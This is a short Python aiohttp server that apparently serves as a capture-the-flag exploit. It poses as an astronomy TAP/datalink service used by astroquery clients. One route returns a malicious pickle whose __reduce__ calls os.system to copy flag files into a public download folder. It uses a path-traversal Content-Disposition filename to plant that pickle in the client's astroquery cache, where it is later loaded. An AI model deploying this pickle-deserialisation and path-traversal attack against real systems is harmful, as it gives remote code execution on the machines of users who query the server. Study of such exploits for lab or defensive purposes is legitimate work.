import pickle
import os
from aiohttp import web

routes = web.RouteTableDef()

@routes.post("/tap/sync")
async def tap_sync(_):
    with open("tapsync.xml", "r") as f:
        return web.Response(body=f.read(), headers={
            "Content-Type": "application/x-votable+xml",
            "Content-Disposition": 'inline; filename="result_r04lpwpzo2mb7nj2.xml"',
        })

@routes.get("/datalink/sync")
async def datalink_sync(_):
    with open("datalinksync.xml", "r") as f:
        return web.Response(body=f.read(), headers={
            "Content-Type": "application/x-votable+xml;content=datalink",
        })

@routes.get("/datalink/{tail:.*}")
async def datalink_file(_):
    class RCE:
        def __reduce__(self):
            cmd = ("cp /app/flag_* /app/static/downloads/1609dd116bbe75bac8cc16c4a596c4ead331582d3d831422162e5cc5f76bf2cd.txt")
            return os.system, (cmd,)

    # this hash/filename depends on hostname
    cached_pickle_name = "24f076a760a6b1dea5213471206ab447fe45e5a61027cc8754972517"

    return web.Response(body=pickle.dumps(RCE()), headers={
        "Content-Disposition": f"inline; filename=../../../../home/appuser/.astropy/cache/astroquery/Alma/{cached_pickle_name}.pickle"
    })

app = web.Application()
app.router.add_routes(routes)
web.run_app(app, port=8000)
